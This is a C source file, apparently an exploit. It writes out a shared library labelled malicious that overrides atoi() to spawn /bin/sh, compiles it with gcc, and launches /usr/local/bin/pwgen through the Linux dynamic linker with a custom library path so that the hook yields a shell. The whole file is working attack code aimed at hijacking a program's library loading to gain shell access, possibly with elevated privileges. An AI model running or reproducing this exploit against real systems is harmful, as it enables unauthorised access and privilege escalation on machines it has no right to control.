#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main() {
    // Malicious shared library code as a string
    const char *library_code =
        "#define _GNU_SOURCE\n"
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "#include <dlfcn.h>\n"
        "\n"
        "// Function pointer to hold original atoi()\n"
        "int (*original_atoi)(const char *str) = NULL;\n"
        "\n"
        "// Hooked atoi() function\n"
        "int atoi(const char *str) {\n"
        "    if (!original_atoi) {\n"
        "        original_atoi = dlsym(RTLD_NEXT, \"atoi\");\n"
        "        if (!original_atoi) {\n"
        "            fprintf(stderr, \"Error finding original atoi()\\n\");\n"
        "            exit(1);\n"
        "        }\n"
        "    }\n"
        "    system(\"/bin/sh\");\n"
        "    return original_atoi(str);\n"
        "}\n";

    // Write the malicious code to a .c file
    FILE *file = fopen("malicious.c", "w");
    if (!file) {
        perror("fopen");
        return 1;
    }
    fprintf(file, "%s", library_code);
    fclose(file);

    // Compile the malicious shared library
    if (system("gcc -shared -fPIC -o malicious.so malicious.c -ldl") != 0) {
        fprintf(stderr, "Compilation failed\n");
        return 1;
    }

    // Set up paths
    const char *ld_path = "/lib64/ld-linux-x86-64.so.2";  // Path to dynamic linker
    const char *target = "/usr/local/bin/pwgen";  // Target binary
    const char *lib_path = "./";  // Path where malicious.so is stored

    // Set LD_LIBRARY_PATH
    if (setenv("LD_LIBRARY_PATH", lib_path, 1) != 0) {
        perror("setenv");
        return 1;
    }

    // Execute pwgen with -t=1234 argument
    execl(ld_path, ld_path, "--library-path", lib_path, target, "-t=1234", NULL);

    // If execl fails, print error
    perror("execl failed");
    return 1;
}
